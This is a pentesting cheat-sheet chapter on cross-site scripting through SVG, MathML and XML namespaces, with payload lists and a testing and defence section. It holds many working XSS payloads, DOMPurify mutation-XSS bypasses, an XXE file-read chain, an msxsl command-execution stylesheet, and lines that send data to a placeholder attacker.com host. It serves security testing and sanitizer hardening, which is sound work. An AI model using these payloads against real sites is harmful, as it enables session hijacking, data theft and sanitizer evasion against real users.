# 23 - SVG, MathML & XML XSS

## Overview

SVG, MathML, and XML namespaces introduce parsing contexts that differ fundamentally from standard HTML. Browsers switch between HTML, SVG, and MathML parsers based on namespace-triggering elements, creating opportunities for namespace confusion, mutation XSS (mXSS), and sanitizer bypasses. These vectors are critical because many WAFs and sanitizers fail to account for the full complexity of multi-namespace document parsing.

**Sources**: [PortSwigger XSS Cheat Sheet (2026 Edition)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), [PayloadsAllTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection), [OWASP XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

---

## 1. SVG-Based XSS

### 1.1 SVG Event Handlers (Complete Reference)

SVG elements support a wide range of event handlers that execute JavaScript. Many sanitizers only block `onload` and `onclick`, missing the full set.

**Mouse Events:**
| Handler | Trigger Condition |
|---------|-------------------|
| `onclick` | Element clicked |
| `ondblclick` | Element double-clicked |
| `onmousedown` | Mouse button pressed on element |
| `onmouseup` | Mouse button released on element |
| `onmouseover` | Mouse cursor enters element |
| `onmouseout` | Mouse cursor leaves element |
| `onmousemove` | Mouse cursor moves within element |
| `onmouseenter` | Mouse enters element (no bubbling) |
| `onmouseleave` | Mouse leaves element (no bubbling) |

**Focus Events:**
| Handler | Trigger Condition |
|---------|-------------------|
| `onfocusin` | Element gains focus (fires when window receives focus) |
| `onfocusout` | Element loses focus |
| `onfocus` | Element receives focus |
| `onblur` | Element loses focus |

**Animation Events (SVG-Specific):**
| Handler | Trigger Condition |
|---------|-------------------|
| `onbegin` | Animation timeline begins (fires immediately) |
| `onend` | Animation timeline ends |
| `onrepeat` | Animation repeats |

**Activation Events:**
| Handler | Trigger Condition |
|---------|-------------------|
| `onactivate` | Element activated (pointer or keyboard) |
| `onload` | Element and resources finished loading |
| `onerror` | Resource fails to load |

**Source**: [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### 1.2 SVG Script Element

SVG has its own `<script>` element that operates within the SVG namespace:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS via SVG script')</script>
</svg>
```

When served with `Content-Type: image/svg+xml`, the browser parses and executes embedded scripts. Critically, when served inline in HTML, the SVG script element also executes:

```html
<svg><script>alert(document.domain)</script></svg>
```

The SVG script element can also use `xlink:href` for external script loading:

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script xlink:href="data:text/javascript,alert(1)"></script>
</svg>
```

### 1.3 SVG foreignObject

The `<foreignObject>` element allows embedding non-SVG content (HTML, XHTML) inside an SVG document. This is one of the most powerful SVG XSS vectors because it enables full HTML context within SVG:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="500" height="500">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
    </body>
  </foreignObject>
</svg>
```

**CVE-2022-28284 (Firefox)**: XSS via SVG `foreignObject` with iframe loaded through a same-origin SVG file from a `<use>` element. Since the SVG document was same-origin, the iframe `srcdoc` document inherited the origin, enabling full DOM access.

**Source**: [Mozilla Bug 1754522](https://bugzilla.mozilla.org/show_bug.cgi?id=1754522)

### 1.4 SVG animate, set, and animateTransform

PortSwigger research demonstrated that SVG animation elements can manipulate attributes to inject JavaScript URLs, bypassing WAFs that look for `javascript:` in static attributes.

**animate element - href manipulation:**
```html
<svg>
  <a id=xss>
    <text x=20 y=20>Click</text>
    <animate xlink:href=#xss attributeName=href
      dur=5s repeatCount=indefinite
      keytimes="0;0;1"
      values="https://safe.com?;javascript:alert(1);0" />
  </a>
</svg>
```

The `values` attribute accepts semicolon-separated values, and the `keyTimes` attribute controls pacing. Setting `keytimes="0;0;1"` forces the animation to immediately jump to the second value (the `javascript:` URL).

**set element - direct attribute replacement:**
```html
<svg>
  <a id=xss href="https://safe.com">
    <text x=20 y=20>Click</text>
    <set xlink:href=#xss attributeName=href to="javascript:alert(1)" />
  </a>
</svg>
```

**animateTransform with onbegin:**
```html
<svg><animatetransform onbegin=alert(1)>
```

**Source**: [PortSwigger Research - SVG animate XSS vector](https://portswigger.net/research/svg-animate-xss-vector)

### 1.5 SVG use Element

The `<use>` element references other SVG elements by ID. It can reference elements within the same document or from external same-origin SVG files:

```xml
<svg>
  <use xlink:href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x" />
</svg>
```

Firefox historically supported `data:` URIs in `xlink:href` for `<use>`, enabling cross-context script execution. The SVG spec prohibits cross-origin requests in `<use>` elements, but same-origin external SVG files are valid targets.

**Source**: [InsertScript - XSS Challenge Solution SVG use](https://insert-script.blogspot.com/2020/09/xss-challenge-solution-svg-use.html)

### 1.6 SVG filter and feImage for Data Exfiltration

SVG filters with `feImage` can load external resources, enabling data exfiltration:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <defs>
    <filter id="leak">
      <feImage xlink:href="https://attacker.com/log?data=exfil" />
    </filter>
  </defs>
  <rect width="100" height="100" filter="url(#leak)" />
</svg>
```

In server-side SVG rasterization contexts (e.g., image processing pipelines), `feImage` can be used for SSRF and internal network scanning.

**Source**: [SVG Rasterizer Cheatsheet](https://github.com/yuriisanin/svg2raster-cheatsheet)

### 1.7 Inline SVG vs SVG File Serving

| Context | Script Execution | Event Handlers | foreignObject |
|---------|-----------------|----------------|---------------|
| Inline SVG in HTML | Yes | Yes | Yes |
| SVG via `<img>` tag | **No** | **No** | **No** |
| SVG via `<object>` / `<embed>` | Yes (own context) | Yes | Yes |
| SVG via CSS `background-image` | **No** | **No** | **No** |
| SVG served directly (`image/svg+xml`) | Yes | Yes | Yes |
| SVG via `<iframe>` | Yes (own context) | Yes | Yes |

Critical insight: The `<img>` tag is the only safe way to embed untrusted SVGs. All other methods permit script execution.

**Source**: [w3tutorials - XSS and SVG via img tag](https://www.w3tutorials.net/blog/xss-when-loading-untrusted-svg-using-img-tag/)

---

## 2. MathML-Based XSS

### 2.1 The math Element in HTML5

HTML5 natively supports MathML via the `<math>` element. When the HTML parser encounters `<math>`, it switches to the MathML namespace, changing how subsequent elements are parsed.

```html
<math><mi>x</mi></math>
```

### 2.2 annotation-xml and Namespace Switching

The `annotation-xml` element is designated as an HTML integration point when its `encoding` attribute equals `text/html` or `application/xhtml+xml`. Inside an HTML integration point, the parser switches back to HTML parsing rules.

```html
<math>
  <annotation-xml encoding="text/html">
    <img src=x onerror=alert(1)>
  </annotation-xml>
</math>
```

This creates a parsing divergence: sanitizers may see the content as MathML (safe), while browsers parse it as HTML (dangerous).

### 2.3 Mutation XSS via MathML Namespace Confusion

**DOMPurify < 2.0.17 Bypass (CVE-2020-26870)**:

The vulnerability exploits the difference between how DOMPurify and the browser parse MathML content. The `mglyph` and `malignmark` elements are special in the HTML spec - they exist in the MathML namespace when they are direct children of MathML text integration points, but all other tags default to the HTML namespace.

```html
<math>
  <mtext>
    <table>
      <mglyph>
        <style><!--</style>
        <img src=x onerror=alert(1)>
      </mglyph>
    </table>
  </mtext>
</math>
```

**How it works**: DOMPurify parses `<style>` as being in the HTML namespace (where its content is treated as raw text). After sanitization, the browser re-parses and the `<style>` ends up in the MathML namespace (where its content is parsed as markup), causing the comment `<!--` to not be treated as a comment, and the `<img>` tag to execute.

**Source**: [Securitum - Mutation XSS via MathML namespace confusion](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)

**DOMPurify < 2.2.2 Bypass** (SVG-to-MathML namespace chain):

```html
<svg>
  <math>
    <mtext>
      <mglyph>
        <svg>
          <mtext>
            <style><img src=x onerror=alert(1)></style>
          </mtext>
        </svg>
      </mglyph>
    </mtext>
  </math>
</svg>
```

This payload chains SVG and MathML namespace switches to confuse the sanitizer about which namespace the `<style>` element belongs to.

**Source**: [Daniel Santos - SVG and back, mXSS via namespace confusion for DOMPurify 2.2.2](https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f)

---

## 3. XML Injection and XSS

### 3.1 XHTML XSS

XHTML documents parsed as `application/xhtml+xml` follow XML parsing rules. This means:
- All elements must be properly closed
- Case sensitivity applies
- CDATA sections can contain raw script content

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<body>
  <script type="text/javascript">
  //<![CDATA[
  alert(document.domain)
  //]]>
  </script>
</body>
</html>
```

CDATA sections in XHTML allow bypassing HTML entity encoding that would normally neutralize payloads.

### 3.2 XLink Namespace Exploitation

The XLink namespace (`http://www.w3.org/1999/xlink`) provides `href` attributes in SVG that can carry `javascript:` URIs:

```html
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <a xlink:href="javascript:alert(1)">
    <text x="20" y="20">Click me</text>
  </a>
</svg>
```

Many sanitizers check for `href="javascript:..."` but miss the namespaced variant `xlink:href="javascript:..."`. Angular had a vulnerability (GHSA-jrmj-c5cx-3cw6) where SVG `xlink:href` attributes were not properly sanitized.

**Source**: [XSS Unleashed: Bypassing Filters with XLink Namespace](https://smilehacker.medium.com/xss-unleashed-bypassing-filters-with-xlink-namespace-be38adf4c8bc), [Angular SVG XSS Advisory](https://github.com/angular/angular/security/advisories/GHSA-jrmj-c5cx-3cw6)

### 3.3 XXE + XSS Chains

XML External Entity (XXE) injection can be chained with XSS when XML responses are rendered in the browser:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
  <script>
    // Exfiltrate the resolved entity value
    new Image().src='https://attacker.com/steal?data='+document.querySelector('text').textContent;
  </script>
</svg>
```

When a server processes XML with XXE and returns the result in a web context, the resolved entity data can be exfiltrated via injected script.

### 3.4 XSLT Injection for XSS

XSLT (Extensible Stylesheet Language Transformations) processors can generate HTML output containing XSS payloads:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html>
      <body>
        <script>alert(document.domain)</script>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

**Microsoft XSLT namespace script execution:**
```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="http://attacker.com">
  <msxsl:script language="JScript" implements-prefix="user">
    function xml(nodelist) {
      var r = new ActiveXObject("WScript.Shell");
      r.Run("calc.exe");
    }
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xml(.)"/>
  </xsl:template>
</xsl:stylesheet>
```

**Source**: [PayloadsAllTheThings XSLT Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/), [HackTricks XSLT Injection](https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations)

---

## 4. Namespace Confusion Attacks

### 4.1 Parser Differential Exploitation

The HTML parser, SVG parser, and MathML parser each handle elements differently. Namespace confusion occurs when:

1. A sanitizer parses in one namespace context
2. The browser re-parses in a different namespace context
3. Elements that were inert in one context become active in another

**Key namespace transition elements:**
| Element | Effect |
|---------|--------|
| `<svg>` | Switches to SVG namespace |
| `<math>` | Switches to MathML namespace |
| `<foreignObject>` (in SVG) | Switches back to HTML namespace |
| `<annotation-xml encoding="text/html">` (in MathML) | Switches back to HTML namespace |
| `<mtext>`, `<mi>`, `<mo>`, `<mn>`, `<ms>` | MathML text integration points |
| `<desc>`, `<title>`, `<foreignObject>` (in SVG) | SVG HTML integration points |

### 4.2 The mXSS Cheatsheet

The Sonar mXSS cheatsheet catalogs all known mutation patterns across browsers and sanitizers, including namespace-based mutations.

**Source**: [Sonar mXSS Cheatsheet](https://sonarsource.github.io/mxss-cheatsheet/)

---

## 5. SVG/MathML/XML XSS Payloads

### SVG Payloads

```html
<!-- 1. Classic SVG onload -->
<svg onload=alert(1)>

<!-- 2. SVG with animateTransform onbegin (no user interaction) -->
<svg><animatetransform onbegin=alert(1)>

<!-- 3. SVG set element with onbegin -->
<svg><set onbegin=alert(1)>

<!-- 4. SVG animate onbegin -->
<svg><animate onbegin=alert(1)>

<!-- 5. SVG foreignObject with HTML body -->
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload=alert(1)></body></foreignObject></svg>

<!-- 6. SVG script element -->
<svg><script>alert(document.domain)</script></svg>

<!-- 7. SVG a element with xlink:href -->
<svg><a xlink:href="javascript:alert(1)"><text x=20 y=20>XSS</text></a></svg>

<!-- 8. SVG image onerror -->
<svg><image href=x onerror=alert(1)>

<!-- 9. SVG use with data URI (Firefox) -->
<svg><use xlink:href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">

<!-- 10. SVG animate href manipulation (WAF bypass) -->
<svg><a id=x><text x=20 y=20>XSS</text></a><animate xlink:href=#x attributeName=href values="javascript:alert(1)" dur=1s repeatCount=indefinite /></svg>

<!-- 11. SVG discard onbegin -->
<svg><discard onbegin=alert(1)>

<!-- 12. SVG onfocusin with tabindex -->
<svg><rect tabindex=1 onfocusin=alert(1) width=100 height=100></rect></svg>
```

**Source**: [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### MathML Payloads

```html
<!-- 13. MathML annotation-xml namespace switch -->
<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>

<!-- 14. MathML maction with xlink:href -->
<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">Click<mtext>XSS</mtext></maction></math>

<!-- 15. DOMPurify bypass via mglyph namespace confusion -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)></mglyph></table></mtext></math>

<!-- 16. MathML with SVG nesting -->
<math><annotation-xml encoding="text/html"><svg><script>alert(1)</script></svg></annotation-xml></math>

<!-- 17. MathML mtext with embedded HTML -->
<math><mtext><iframe srcdoc="<script>alert(1)</script>"></iframe></mtext></math>
```

**Source**: [Securitum MathML mXSS Research](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/), [Jorian Woltjer - Mutation XSS](https://jorianwoltjer.com/blog/p/research/mutation-xss)

### XML / XHTML Payloads

```html
<!-- 18. XHTML CDATA bypass -->
<script xmlns="http://www.w3.org/1999/xhtml"><![CDATA[alert(document.domain)]]></script>

<!-- 19. XLink href in SVG anchor -->
<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><rect width=100 height=100 /></a></svg>

<!-- 20. XSLT output with script -->
<xsl:value-of select="'&lt;script&gt;alert(1)&lt;/script&gt;'" disable-output-escaping="yes"/>

<!-- 21. XML processing instruction (legacy IE) -->
<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="data:text/xml,<xsl:stylesheet version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform'><xsl:template match='/'><script>alert(1)</script></xsl:template></xsl:stylesheet>"?>

<!-- 22. SVG + MathML nested namespace confusion chain -->
<svg><math><mtext><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></mtext></math></svg>

<!-- 23. XML entity expansion to XSS -->
<!DOCTYPE foo [<!ENTITY xss "<script xmlns='http://www.w3.org/1999/xhtml'>alert(1)</script>">]><foo>&xss;</foo>
```

**Source**: [PayloadsAllTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md), [Mizu.re - DOMPurify Bypasses](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes)

---

## 6. Testing Methodology

### Step 1: Identify SVG/MathML/XML Input Points
- File upload accepting SVG/XML
- Rich text editors permitting SVG/MathML
- API endpoints returning XML/XHTML
- XSLT transformation pipelines

### Step 2: Test Namespace Switching
- Inject `<svg>` and `<math>` elements to determine if namespace transitions are permitted
- Test `foreignObject` and `annotation-xml` for HTML integration point creation
- Test nested namespace chains: SVG -> MathML -> HTML -> SVG

### Step 3: Test SVG Event Handlers
- Iterate through all SVG event handlers (onbegin, onfocusin, onactivate, etc.)
- Test animation elements (animate, set, animateTransform) with onbegin
- Test tabindex + onfocusin combinations

### Step 4: Test Sanitizer Bypasses
- Use mutation XSS payloads targeting DOMPurify, js-xss, sanitize-html
- Test mglyph/malignmark namespace confusion
- Test parser differentials between sanitizer and browser

### Step 5: Verify Execution Context
- Confirm whether XSS executes in the application's origin
- Test SVG served via different embedding methods (img, object, embed, iframe, inline)
- Verify Content-Type headers for uploaded SVG files

---

## 7. Detection and Defense Notes

**For defenders (useful context for testers to understand bypass surface):**
- SVG sanitization must strip `<script>`, `<foreignObject>`, all event handlers, and `xlink:href` with `javascript:` URIs
- Serve user-uploaded SVGs with `Content-Disposition: attachment` or from a separate domain
- Use `<img>` tags exclusively for untrusted SVG rendering (scripts are blocked)
- Apply `X-Content-Type-Options: nosniff` to prevent MIME sniffing of SVG as HTML
- DOMPurify with `FORBID_TAGS: ['svg', 'math']` if SVG/MathML is not needed
